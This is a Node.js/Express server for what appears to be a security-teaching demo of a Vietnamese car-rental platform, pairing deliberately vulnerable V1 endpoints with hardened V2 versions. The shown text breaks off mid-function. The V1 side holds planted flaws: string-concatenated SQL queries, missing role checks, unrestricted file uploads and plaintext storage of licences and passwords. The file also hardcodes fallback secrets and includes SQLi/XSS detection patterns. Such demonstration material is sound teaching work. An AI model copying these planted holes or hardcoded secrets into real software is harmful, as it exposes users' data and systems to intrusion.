require('dotenv').config();
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto'); 
const fs = require('fs');
const jwt = require('jsonwebtoken');
const cors = require('cors');

const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-key-car-rental';

// Hàm phân tích cookie thủ công từ headers
const parseCookies = (cookieHeader) => {
    const list = {};
    if (!cookieHeader) return list;
    cookieHeader.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        list[parts.shift().trim()] = decodeURIComponent(parts.join('='));
    });
    return list;
};

// Hàm băm mật khẩu sử dụng thuật toán Scrypt và Salt ngẫu nhiên (Lớp 3)
const hashPassword = (password) => {
    const salt = crypto.randomBytes(16).toString('hex');
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return `${salt}:${hash}`;
};

// Hàm xác thực mật khẩu băm Scrypt
const verifyPassword = (password, storedValue) => {
    if (!storedValue || !storedValue.includes(':')) return false;
    const [salt, originalHash] = storedValue.split(':');
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return hash === originalHash;
};
const TELEMATICS_SECRET = process.env.TELEMATICS_SECRET || "secure-car-telematics-key";

// Khóa mã hóa CSDL local AES-256-GCM (Lớp 3)
const DB_ENCRYPTION_KEY = Buffer.from(process.env.DB_ENCRYPTION_KEY || '0000000000000000000000000000000000000000000000000000000000000000', 'hex');

function encryptAES(text) {
    if (!text) return text;
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', DB_ENCRYPTION_KEY, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    return `${iv.toString('hex')}:${authTag}:${encrypted}`;
}

function decryptAES(cipherText) {
    if (!cipherText || !cipherText.includes(':')) return cipherText;
    try {
        const [ivHex, authTagHex, encryptedHex] = cipherText.split(':');
        if (!ivHex || !authTagHex || !encryptedHex) return cipherText;
        const iv = Buffer.from(ivHex, 'hex');
        const authTag = Buffer.from(authTagHex, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', DB_ENCRYPTION_KEY, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        console.error("Giải mã CSDL lỗi:", e.message);
        return cipherText;
    }
}

// Bộ lọc Tường lửa WAF mô phỏng (Lớp 1)
const wafMiddleware = (req, res, next) => {
    const checkMalicious = (val) => {
        if (typeof val !== 'string') return false;
        // Phát hiện dấu hiệu SQLi hoặc XSS
        const sqliPattern = /union\s+select|or\s+1\s*=\s*1|--/i;
        const xssPattern = /<script|onerror|onload/i;
        return sqliPattern.test(val) || xssPattern.test(val);
    };

    let isMalicious = false;
    const payload = JSON.stringify(req.body || {}) + JSON.stringify(req.query || {}) + JSON.stringify(req.params || {});
    
    if (checkMalicious(payload)) {
        isMalicious = true;
    }

    if (isMalicious) {
        const logMsg = `[WAF BLOCK] Chặn đứng tấn công từ IP ${req.ip || '127.0.0.1'}: Phát hiện payload chứa mã độc!`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
        return res.status(403).json({ error: "[WAF] Yêu cầu bị chặn: Phát hiện payload tấn công chứa mã độc!" });
    }
    next();
};

// Hàm sinh mã OTP 6 số theo thời gian thực (chu kỳ 30s) chuẩn TOTP
const getTOTP = (secret, timeStep = 30) => {
    const counter = Math.floor(Date.now() / 1000 / timeStep);
    const buffer = Buffer.alloc(8);
    buffer.writeUInt32BE(counter, 4);
    
    const hmac = crypto.createHmac('sha1', secret).update(buffer).digest();
    const offset = hmac[hmac.length - 1] & 0xf;
    const code = ((hmac[offset] & 0x7f) << 24) |
                 ((hmac[offset + 1] & 0xff) << 16) |
                 ((hmac[offset + 2] & 0xff) << 8) |
                 (hmac[offset + 3] & 0xff);
    return String(code % 1000000).padStart(6, '0');
};

const app = express();
app.use(express.json());
app.use(cors({ origin: true, credentials: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/public', express.static(path.join(__dirname, 'public')));

// =========================================================
// TẠO CẶP KHÓA RSA (Cho Kịch bản 4) - LƯU CỐ ĐỊNH XUỐNG TỆP PEM
// =========================================================
const publicKeyPath = path.join(__dirname, 'public.pem');
const privateKeyPath = path.join(__dirname, 'private.pem');

let publicKey, privateKey;
if (fs.existsSync(publicKeyPath) && fs.existsSync(privateKeyPath)) {
    publicKey = fs.readFileSync(publicKeyPath, 'utf8');
    privateKey = fs.readFileSync(privateKeyPath, 'utf8');
    console.log('Đã tải cặp khóa RSA hiện có từ tệp tin.');
} else {
    // Tạo khóa công khai (Public Key) và khóa bí mật (Private Key) độ dài 2048-bit
    const keys = crypto.generateKeyPairSync("rsa", {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;
    fs.writeFileSync(publicKeyPath, publicKey, 'utf8');
    fs.writeFileSync(privateKeyPath, privateKey, 'utf8');
    console.log('Đã sinh mới và lưu cặp khóa RSA xuống tệp tin.');
}

// =========================================================
// PHẦN 1: KHỞI TẠO CƠ SỞ DỮ LIỆU SQLITE
// =========================================================
// Xóa file rác temp.db khi khởi động
const tempDbFile = path.join(__dirname, 'temp.db');
if (fs.existsSync(tempDbFile)) {
    try {
        fs.unlinkSync(tempDbFile);
        console.log('[DB] Đã dọn dẹp file rác temp.db.');
    } catch (e) {
        console.error('[DB] Lỗi khi dọn dẹp temp.db:', e.message);
    }
}

const db = new sqlite3.Database('./database.db', (err) => {
    if (err) console.error(err.message);
    console.log('Đã kết nối với CSDL SQLite.');
    db.run("PRAGMA busy_timeout = 10000"); // SQLite busy timeout to avoid write conflicts
});
db.on('error', (err) => console.error('GLOBAL DB ERROR:', err));

// Hook to intercept SecurityAlerts and format them nicely in the terminal
const originalDbRun = db.run.bind(db);
db.run = function(sql, params, callback) {
    if (typeof sql === 'string' && sql.includes('INSERT INTO SecurityAlerts')) {
        let type = 'UNKNOWN', msg = 'Không có thông tin', severity = 'INFO';
        if (Array.isArray(params) && params.length >= 5) {
            type = params[2]; msg = params[3]; severity = params[4];
        }
        
        const colors = {
            'CRITICAL': '\x1b[41m\x1b[37m\x1b[1m',
            'HIGH': '\x1b[31m\x1b[1m',
            'WARNING': '\x1b[33m\x1b[1m',
            'INFO': '\x1b[36m'
        };
        const reset = '\x1b[0m';
        const color = colors[severity] || reset;
        
        console.log(`\n${color}[================ SECURITY ALERT ================]${reset}`);
        console.log(`${color} SEVERITY : ${severity}${reset}`);
        console.log(`${color} TYPE     : ${type}${reset}`);
        console.log(`${color} MESSAGE  : ${msg}${reset}`);
        console.log(`${color}[================================================]${reset}\n`);
    }
    return originalDbRun(sql, params, callback);
};


// =========================================================
// HÀM RESET DATABASE (Seed dữ liệu 15 xe toàn quốc)
// =========================================================

// =========================================================
// HÀM RESET DATABASE (Seed dữ liệu 10 xe toàn quốc có Hộp đen & GPS)
function restoreGpsSessions() {
    console.log('[GPS] Khôi phục các xe đang hoạt động sau khi Reset...');
    db.all(`SELECT * FROM Rentals WHERE Status = 'Active'`, (err, rentals) => {
        if (err) {
            console.error('[GPS] Lỗi lấy Rentals:', err);
            return;
        }
        if (!rentals) return;
        console.log(`[GPS] Đã tìm thấy ${rentals.length} Rentals Active.`);
        rentals.forEach(r => { 
            if (!gpsState[r.VehicleID]) {
                db.get(`SELECT * FROM VehicleGPS WHERE VehicleID = ?`, [r.VehicleID], (err, gps) => {
                    initGpsSession(r.VehicleID, r.AccountID, r.RouteType || 'hanoi', gps);
                });
            }
        });
        if (rentals.length) console.log(`[V3-GPS] Khôi phục thành công ${rentals.length} phiên GPS đang chạy (Persistence).`);
    });
}

const resetDatabase = () => {
    return new Promise((resolve, reject) => {
        // Dừng tất cả GPS sessions đang chạy
        for (let vid in gpsState) {
            const s = gpsState[vid];
            if (s && s.intervalId) clearInterval(s.intervalId);
            delete gpsState[vid];
        }

        const adminHash = hashPassword('admin');
        const userHashes = {};
        for (let i = 1; i <= 10; i++) {
            userHashes[`user${i}`] = hashPassword(`user${i}`);
        }

        const sql = `
            PRAGMA foreign_keys = OFF;
            DROP TABLE IF EXISTS Accounts;
            DROP TABLE IF EXISTS Vehicles;
            DROP TABLE IF EXISTS SystemLogs;
            DROP TABLE IF EXISTS UserDocuments;
            DROP TABLE IF EXISTS Rentals;
            DROP TABLE IF EXISTS VehicleInfotainment;
            DROP TABLE IF EXISTS VehicleGPS;
            DROP TABLE IF EXISTS SecurityAlerts;
            DROP TABLE IF EXISTS VehicleCategories;
            DROP TABLE IF EXISTS Reviews;
            DROP TABLE IF EXISTS LoginLogs;

            CREATE TABLE Accounts (AccountID INTEGER PRIMARY KEY AUTOINCREMENT, Username TEXT, PasswordPlain TEXT, PasswordHash TEXT, Role TEXT, MfaSecret TEXT, MfaEnabled BOOLEAN, LoginAttempts INTEGER DEFAULT 0, LockoutUntil DATETIME DEFAULT NULL, FullName TEXT DEFAULT '', Phone TEXT DEFAULT '', Email TEXT DEFAULT '', DeviceModel TEXT DEFAULT 'Unknown');
            CREATE TABLE SystemLogs (LogID INTEGER PRIMARY KEY AUTOINCREMENT, Description TEXT, Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP);
            CREATE TABLE UserDocuments (DocID INTEGER PRIMARY KEY AUTOINCREMENT, AccountID INTEGER, LicenseData TEXT, IsEncrypted BOOLEAN, LicenseNumber TEXT DEFAULT '', ImageURL TEXT DEFAULT '', VerifiedStatus TEXT DEFAULT 'pending');
            CREATE TABLE VehicleInfotainment (VehicleID INTEGER PRIMARY KEY, SyncedContacts TEXT, GPSHistory TEXT, ActiveBluetoothDevice TEXT);
            CREATE TABLE VehicleGPS (VehicleID INTEGER PRIMARY KEY, Lat REAL, Lon REAL, Speed REAL, Heading REAL, Mode TEXT, Address TEXT, LastReported TEXT, Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP);
            CREATE TABLE SecurityAlerts (AlertID INTEGER PRIMARY KEY AUTOINCREMENT, VehicleID INTEGER, AccountID INTEGER, Type TEXT, Message TEXT, Severity TEXT, Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, Resolved BOOLEAN DEFAULT 0);
            CREATE TABLE VehicleCategories (CategoryID INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Icon TEXT);
            CREATE TABLE Vehicles (VehicleID INTEGER PRIMARY KEY AUTOINCREMENT, LicensePlate TEXT, Model TEXT, Status TEXT, CategoryID INTEGER DEFAULT 1, Year INTEGER DEFAULT 2023, Seats INTEGER DEFAULT 5, Transmission TEXT DEFAULT 'Auto', FuelType TEXT DEFAULT 'Petrol', PricePerDay INTEGER DEFAULT 500000, Features TEXT DEFAULT '[]', Description TEXT DEFAULT '', ImageURL TEXT DEFAULT '', Version INTEGER DEFAULT 1, OwnerID INTEGER DEFAULT NULL);
            CREATE TABLE Rentals (RentalID INTEGER PRIMARY KEY AUTOINCREMENT, VehicleID INTEGER, AccountID INTEGER, Status TEXT, StartDate TEXT, EndDate TEXT, PickupLocation TEXT DEFAULT 'Ha Noi', ReturnLocation TEXT DEFAULT 'Ha Noi', TotalAmount INTEGER DEFAULT 0, RouteType TEXT DEFAULT 'hanoi');
            CREATE TABLE Reviews (ReviewID INTEGER PRIMARY KEY AUTOINCREMENT, AccountID INTEGER, VehicleID INTEGER, RentalID INTEGER, Rating INTEGER, Comment TEXT, Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP);
            CREATE TABLE LoginLogs (LogID INTEGER PRIMARY KEY AUTOINCREMENT, AccountID INTEGER, Lat REAL, Lon REAL, Timestamp TEXT);

            INSERT INTO Accounts (Username, PasswordPlain, PasswordHash, Role, FullName, Phone, Email, DeviceModel) VALUES 
                ('admin', 'admin', '${adminHash}', 'Admin', 'Nguyen Van Admin', '0901234567', 'admin@rentalshield.vn', 'iPhone 15 Pro Max'),
                ('user1', 'user1', '${userHashes.user1}', 'User', 'Tran Thi Thu', '0912345678', 'thu@gmail.com', 'iPhone 13'),
                ('user2', 'user2', '${userHashes.user2}', 'User', 'Le Van Hung', '0923456789', 'hung@gmail.com', 'Samsung Galaxy S24 Ultra'),
                ('user3', 'user3', '${userHashes.user3}', 'User', 'Nguyen Van Ba', '0934567890', 'ba@gmail.com', 'iPhone 14');

            INSERT INTO VehicleCategories (Name, Icon) VALUES ('Sedan', 'sedan'), ('SUV', 'suv'), ('Pickup', 'pickup'), ('Electric', 'electric'), ('Luxury', 'luxury');

            INSERT INTO Vehicles (LicensePlate, Model, Status, ImageURL, OwnerID) VALUES 
                ('29A-11111', 'Toyota Vios', 'Available', 'toyota_vios.png', 3),
                ('30F-22222', 'Tesla Model Y', 'Rented', 'tesla_modely.png', NULL),
                ('30H-33333', 'BMW 320i', 'Rented', 'bmw_320i.png', NULL),
                ('43A-44444', 'Honda Civic', 'Available', 'honda_civic.png', 2),
                ('51G-55555', 'Hyundai SantaFe', 'Rented', 'hyundai_santafe.png', NULL),
                ('51H-66666', 'Ford Ranger', 'Available', 'ford_ranger.png', 1),
                ('29C-77777', 'VinFast VF8', 'Available', 'vinfast_vf8.png', NULL),
                ('65A-88888', 'Kia Seltos', 'Available', 'kia_seltos.png', NULL),
                ('30K-99999', 'Mercedes C300', 'Available', 'mercedes_c300.png', NULL),
                ('51K-10101', 'Mazda 3', 'Available', 'mazda_3.png', NULL);

            INSERT INTO Rentals (VehicleID, AccountID, Status, RouteType) VALUES 
                (2, 3, 'Active', 'north_vietnam'),
                (3, 2, 'Active', 'haiphong'),
                (5, 4, 'Active', 'danang');

            INSERT INTO UserDocuments (AccountID, LicenseData, IsEncrypted, LicenseNumber, ImageURL, VerifiedStatus) 
                SELECT AccountID, PasswordHash, 0, 'B2-' || printf('%06d', AccountID * 111111), '', 'verified'
                FROM Accounts WHERE Role = 'User';

            INSERT INTO VehicleGPS (VehicleID, Lat, Lon, Speed, Mode, Address, LastReported) VALUES 
                (1, 21.0285, 105.8542, 0, 'Parked', 'Gara VNCars Hoàn Kiếm (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (2, 21.0333, 105.8500, 45, 'Moving', 'Đường Thanh Niên, Quận Tây Hồ, Hà Nội', 'Vừa xong (Live)'),
                (3, 20.8449, 106.6881, 60, 'Moving', 'Đường Lạch Tray, Quận Ngô Quyền, Hải Phòng', 'Vừa xong (Live)'),
                (4, 16.0471, 108.2068, 0, 'Parked', 'Gara VNCars Hải Châu (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (5, 16.0544, 108.2022, 50, 'Moving', 'Đường Võ Nguyên Giáp, Quận Sơn Trà, Đà Nẵng', 'Vừa xong (Live)'),
                (6, 12.2388, 109.1967, 0, 'Parked', 'Gara VNCars Nha Trang (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (7, 10.7626, 106.6602, 0, 'Parked', 'Gara VNCars Quận 1 (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (8, 10.8231, 106.6297, 0, 'Parked', 'Gara VNCars Tân Bình (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (9, 10.0452, 105.7469, 0, 'Parked', 'Gara VNCars Ninh Kiều (Trong nhà)', 'Cập nhật mỗi 1 giờ'),
                (10, 10.0234, 105.7500, 0, 'Parked', 'Gara VNCars Cái Răng (Trong nhà)', 'Cập nhật mỗi 1 giờ');

            INSERT INTO VehicleInfotainment (VehicleID, SyncedContacts, GPSHistory, ActiveBluetoothDevice) VALUES 
                (1, 'Lưu vết Khách cũ: Công ty (0243333)', 'Nhật ký GPS: Bãi đỗ xe', 'Ngắt kết nối (Offline)'),
                (2, 'Danh bạ user2: Mẹ (0901234567), Vợ (0911223344)', 'Nhật ký GPS: Cầu Giấy -> Hồ Gươm', 'Samsung Galaxy S24 Ultra (Đang kết nối)'),
                (3, 'Danh bạ user1: Boss (0988888888)', 'Nhật ký GPS: Đồ Sơn -> Lạch Tray', 'iPhone 13 (Đang kết nối)'),
                (4, 'Lưu vết Khách cũ: Gara (09121212)', 'Nhật ký GPS: Sân bay Đà Nẵng', 'Ngắt kết nối (Offline)'),
                (5, 'Danh bạ user3: Đối tác (09333333)', 'Nhật ký GPS: Cầu Rồng -> Hội An', 'iPhone 13 (Đang kết nối)'),
                (6, 'Lưu vết Khách cũ: Vợ (09222222)', 'Nhật ký GPS: Vinpearl Nha Trang', 'Ngắt kết nối (Offline)'),
                (7, 'Lưu vết Khách cũ: Bạn thân (0912345678)', 'Nhật ký GPS: Q1 -> Landmark 81', 'Ngắt kết nối (Offline)'),
                (8, 'Lưu vết Khách cũ: Công ty (08888888)', 'Nhật ký GPS: Tân Sơn Nhất -> Q3', 'Ngắt kết nối (Offline)'),
                (9, 'Lưu vết Khách cũ: Nhà hàng (0292222)', 'Nhật ký GPS: Bến Ninh Kiều', 'Ngắt kết nối (Offline)'),
                (10, 'Lưu vết Khách cũ: Mẹ (09999999)', 'Nhật ký GPS: Cái Răng -> Vĩnh Long', 'Ngắt kết nối (Offline)');
            PRAGMA foreign_keys = ON;
        `;
        db.exec(sql, (err) => {
            if (err) {
                console.error("Lỗi khi resetDatabase:", err);
                reject(err);
            } else {
                console.log("Đã resetDatabase bằng db.exec.");
                wipedBluetoothVehicles.clear();
                resolve();
            }
        });
    });
};

db.get(`SELECT count(*) as count FROM sqlite_master WHERE type='table' AND name='Accounts'`, (err, row) => {
    if (row && row.count > 0) {
        console.log('Database đã tồn tại. Đang khôi phục các phiên GPS đang chạy...');
        /* restoreGpsSessions() call deferred until routes ready */
    } else {
        resetDatabase().then(() => console.log('Đã tạo mới và seed dữ liệu CSDL ban đầu.'));
    }
});

// =========================================================
// API XEM DATABASE DÙNG ĐỂ ĐỐI CHỨNG
// =========================================================
const verifyAdminKey = (req, res, next) => {
    const key = req.headers['x-admin-key'];
    if (key !== 'demo-admin-2026') {
        return res.status(403).json({ error: 'Forbidden: Yêu cầu mã quản trị hợp lệ.' });
    }
    next();
};

app.get('/api/db/accounts', verifyAdminKey, (req, res) => {
    db.all(`SELECT a.*, CASE WHEN d.VerifiedStatus = 'verified' THEN 1 ELSE 0 END as HasLicense
        FROM Accounts a LEFT JOIN UserDocuments d ON a.AccountID = d.AccountID`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});
app.get('/api/db/vehicles', verifyAdminKey, (req, res) => {
    db.all(`SELECT * FROM Vehicles`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});
app.get('/api/db/logs', verifyAdminKey, (req, res) => {
    db.all(`SELECT * FROM SystemLogs`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});
app.get('/api/db/documents', verifyAdminKey, (req, res) => {
    db.all(`SELECT d.*, a.Username FROM UserDocuments d LEFT JOIN Accounts a ON d.AccountID = a.AccountID`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});
app.get('/api/db/rentals', verifyAdminKey, (req, res) => {
    db.all(`SELECT * FROM Rentals`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});
app.get('/api/db/infotainment', verifyAdminKey, (req, res) => {
    db.all(`SELECT * FROM VehicleInfotainment`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});


// =========================================================
// PHẦN 2: CÁC API PHIÊN BẢN V1 - LỖI (VULNERABLE)
// =========================================================

// KB1 (Lỗi SQLi): Nối chuỗi trực tiếp
app.post('/api/v1/messages/admin', (req, res) => {
    const userMessage = req.body.Message;
    const query = `SELECT * FROM SystemLogs WHERE Description LIKE '%${userMessage}%'`;
    db.all(query, (err, rows) => { res.json(rows); });
});

// KB2 (Lớp 2: Bảo mật tầng Ứng dụng & Định danh) - Đăng nhập V1 (Trả Token về Body - Dễ bị XSS đánh cắp qua localStorage)
app.post('/api/v1/auth/login', (req, res) => {
    const { username, password } = req.body;
    db.get(`SELECT * FROM Accounts WHERE Username = ? AND PasswordPlain = ?`, [username, password], (err, row) => {
        if (err || !row) return res.status(401).json({ error: "Sai tài khoản hoặc mật khẩu!" });
        const token = jwt.sign({ AccountID: row.AccountID, Username: row.Username, Role: row.Role }, JWT_SECRET, { expiresIn: '1h' });
        res.json({ token, message: "[V1] Đăng nhập thành công! Token được trả về trong body." });
    });
});

// KB2 (Lỗi Phân quyền): Không kiểm tra Role Admin
const verifyTokenV1 = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        // Fallback về mock user như cũ nếu không truyền token để tránh hỏng các script test cũ
        req.user = { AccountID: 2, Username: 'user1', Role: 'User' }; 
        return next();
    }

    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err) return res.status(403).json({ error: "Token không hợp lệ!" });
        req.user = decoded;
        next();
    });
};

app.delete('/api/v1/admin/vehicles/delete', verifyTokenV1, (req, res) => {
    const vehicleId = req.body.VehicleID;
    db.run(`DELETE FROM Vehicles WHERE VehicleID = ${vehicleId}`, (err) => {
        res.send(`[V1] Đã xóa phương tiện ID: ${vehicleId} bằng quyền User!`);
    });
});

// KB3 (Lỗi Upload File): Không check đuôi tệp
const storageV1 = multer.diskStorage({
  destination: (req, file, cb) => { cb(null, 'uploads/') },
  filename: (req, file, cb) => { cb(null, "V1_" + file.originalname) }
});
const uploadV1 = multer({ storage: storageV1 });
app.post('/api/v1/upload-license', uploadV1.single('license_image'), (req, res) => {
  res.send("[V1] Tải tệp lên thành công (Chấp nhận cả mã độc)!");
});


// KB4 (Lỗi PII): Lưu trữ thông tin nhạy cảm dưới dạng văn bản gốc (Plaintext)
app.post('/api/v1/user/document', verifyTokenV1, (req, res) => {
    const licenseData = req.body.LicenseNumber; // Dữ liệu nhạy cảm
    
    // ĐÃ SỬA: Bổ sung mảng chứa dữ liệu truyền vào các dấu ?
    db.run(`INSERT INTO UserDocuments (AccountID, LicenseData, IsEncrypted) VALUES (?,?,?)`, [req.user.AccountID, licenseData, false], (err) => {
        if (err) return res.status(500).send(err.message);
        res.send("[V1] Đã lưu giấy phép lái xe dưới dạng KHÔNG MÃ HÓA.");
    });
});

// PHẦN 3: CÁC API PHIÊN BẢN V2 - AN TOÀN (SECURED)
// =========================================================
app.use('/api/v2/', express.json({ limit: '10kb' }));
app.use('/api/v2/', helmet());
app.use('/api/v2/', rateLimit({ 
    windowMs: 15 * 60 * 1000, 
    max: 5000,
    message: { error: 'Quá nhiều yêu cầu, vui lòng thử lại sau.' },
    standardHeaders: true,
    legacyHeaders: false
}));
app.use('/api/v2/', wafMiddleware);

// KB1 (Bảo mật SQLi): Dùng Parameterized Queries
app.post('/api/v2/messages/admin', (req, res) => {
    const userMessage = req.body.Message;
    const query = `SELECT * FROM SystemLogs WHERE Description LIKE?`;
    db.all(query, [`%${userMessage}%`], (err, rows) => { res.json(rows); });
});

// KB2 (Lớp 2: Bảo mật tầng Ứng dụng & Định danh) - Đăng nhập V2 (Lưu JWT vào HttpOnly Cookie + Lockout)
app.post('/api/v2/auth/login', (req, res) => {
    const { username, password } = req.body;
    db.get(`SELECT * FROM Accounts WHERE Username = ?`, [username], (err, row) => {
        if (err || !row) return res.status(401).json({ error: "Sai tài khoản hoặc mật khẩu!" });
        
        // Kiểm tra xem tài khoản có đang bị khóa lockout không
        if (row.LockoutUntil && new Date(row.LockoutUntil) > new Date()) {
            const timeLeft = Math.round((new Date(row.LockoutUntil) - new Date()) / 1000);
            return res.status(423).json({ error: `Tài khoản tạm thời bị khóa do nhập sai nhiều lần. Vui lòng thử lại sau ${timeLeft} giây.` });
        }

        // Xác thực mật khẩu đã băm bằng Scrypt + Salt
        const isMatch = verifyPassword(password, row.PasswordHash);
        if (!isMatch) {
            const newAttempts = (row.LoginAttempts || 0) + 1;
            if (newAttempts >= 3) {
                const lockoutTime = new Date(Date.now() + 60 * 1000).toISOString(); // khóa 1 phút
                db.run(`UPDATE Accounts SET LoginAttempts = ?, LockoutUntil = ? WHERE AccountID = ?`, [newAttempts, lockoutTime, row.AccountID]);
                return res.status(423).json({ error: "Sai mật khẩu! Tài khoản đã bị tạm khóa trong 1 phút do nhập sai 3 lần." });
            } else {
                db.run(`UPDATE Accounts SET LoginAttempts = ? WHERE AccountID = ?`, [newAttempts, row.AccountID]);
                return res.status(401).json({ error: `Sai tài khoản hoặc mật khẩu! Bạn còn ${3 - newAttempts} lần thử.` });
            }
        }

        // Reset attempts khi đăng nhập đúng
        db.run(`UPDATE Accounts SET LoginAttempts = 0, LockoutUntil = NULL WHERE AccountID = ?`, [row.AccountID]);

        const loginLat = parseFloat(req.body.lat);
        const loginLon = parseFloat(req.body.lon);

        if (!isNaN(loginLat) && !isNaN(loginLon)) {
            // Lấy lịch sử đăng nhập trước đó
            db.get(`SELECT * FROM LoginLogs WHERE AccountID = ? ORDER BY LogID DESC LIMIT 1`, [row.AccountID], (errLog, lastLog) => {
                if (lastLog) {
                    const distKm = haversineKm(loginLat, loginLon, lastLog.Lat, lastLog.Lon);
                    const timeDiffHours = (Date.now() - new Date(lastLog.Timestamp).getTime()) / (1000 * 60 * 60);
                    
                    if (timeDiffHours > 0) {
                        const requiredSpeed = distKm / timeDiffHours;
                        // Nếu tốc độ di chuyển yêu cầu > 900 km/h (vận tốc máy bay thương mại)
                        // và khoảng thời gian < 1 giờ, thì đây là Impossible Travel!
                        if (requiredSpeed > 900 && timeDiffHours < 1) {
                            const alertMsg = `🚨 PHÁT HIỆN IMPOSSIBLE TRAVEL: Tài khoản "${row.Username}" đăng nhập từ hai địa điểm cách nhau quá xa trong thời gian ngắn (${distKm.toFixed(0)}km trong ${(timeDiffHours*60).toFixed(0)} phút, tốc độ cần thiết: ${requiredSpeed.toFixed(0)} km/h).`;
                            
                            // Khóa tài khoản tạm thời
                            const lockoutTime = new Date(Date.now() + 5 * 60 * 1000).toISOString(); // khóa 5 phút
                            db.run(`UPDATE Accounts SET LockoutUntil = ? WHERE AccountID = ?`, [lockoutTime, row.AccountID]);
                            
                            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                                [null, row.AccountID, 'IMPOSSIBLE_TRAVEL', alertMsg, 'CRITICAL']);
                            
                            return res.status(423).json({ error: `[BẢO MẬT] Đăng nhập bị chặn: Phát hiện dịch chuyển bất khả thi (Impossible Travel). Tài khoản bị tạm khóa 5 phút để bảo mật!` });
                        }
                    }
                }
                
                // Lưu log đăng nhập mới
                db.run(`INSERT INTO LoginLogs (AccountID, Lat, Lon, Timestamp) VALUES (?, ?, ?, ?)`,
                    [row.AccountID, loginLat, loginLon, new Date().toISOString()]);
                
                continueLoginFlow();
            });
        } else {
            continueLoginFlow();
        }

        function continueLoginFlow() {
            // Nếu tài khoản đã kích hoạt MFA OTP -> Yêu cầu xác thực OTP trước
            if (row.MfaEnabled === 1) {
                return res.json({ mfaRequired: true, username: row.Username, message: "Yêu cầu mã xác thực OTP để hoàn tất đăng nhập." });
            }

            const token = jwt.sign({ AccountID: row.AccountID, Username: row.Username, Role: row.Role }, JWT_SECRET, { expiresIn: '1h' });
            
            // Thiết lập Cookie an toàn với cờ HttpOnly, SameSite=Strict
            res.setHeader('Set-Cookie', `access_token=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`);
            res.json({ message: "[V2] Đăng nhập thành công! Token đã được lưu an toàn trong HttpOnly Cookie." });
        }
    });
});

// API V2: Đăng ký tài khoản mới
app.post('/api/v2/auth/register', (req, res) => {
    const { username, password, confirmPassword, fullName, phone, email } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Vui lòng nhập tên đăng nhập và mật khẩu.' });
    if (username.length < 4) return res.status(400).json({ error: 'Tên đăng nhập phải có ít nhất 4 ký tự.' });
    if (password.length < 6) return res.status(400).json({ error: 'Mật khẩu phải có ít nhất 6 ký tự.' });
    if (confirmPassword && password !== confirmPassword) return res.status(400).json({ error: 'Mật khẩu xác nhận không khớp.' });
    db.get(`SELECT AccountID FROM Accounts WHERE Username = ?`, [username], (err, existing) => {
        if (existing) return res.status(409).json({ error: 'Tên đăng nhập đã tồn tại.' });
        const hash = hashPassword(password);
        db.run(`INSERT INTO Accounts (Username, PasswordPlain, PasswordHash, Role, FullName, Phone, Email) VALUES (?,?,?,'User',?,?,?)`,
            [username, password, hash, fullName || '', phone || '', email || ''], function(err2) {
            if (err2) return res.status(500).json({ error: 'Lỗi tạo tài khoản.' });
            const token = jwt.sign({ AccountID: this.lastID, Username: username, Role: 'User' }, JWT_SECRET, { expiresIn: '1h' });
            res.setHeader('Set-Cookie', `access_token=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`);
            res.json({ message: 'Đăng ký thành công! Chào mừng bạn đến với VNCars.', username });
        });
    });
});

// API V2: Đăng xuất - Xóa Cookie
app.post('/api/v2/auth/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'access_token=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0');
    res.json({ message: 'Đăng xuất thành công.' });
});

// API V2: Đăng nhập bước 2 - Xác thực mã OTP (MFA Login) - Chống Brute force & Lockout
app.post('/api/v2/auth/mfa-login', (req, res) => {
    const { username, otp } = req.body;
    if (!username || !otp) {
        return res.status(400).json({ error: "Thiếu thông tin username hoặc otp." });
    }

    db.get(`SELECT * FROM Accounts WHERE Username = ?`, [username], (err, row) => {
        if (err || !row || !row.MfaEnabled || !row.MfaSecret) {
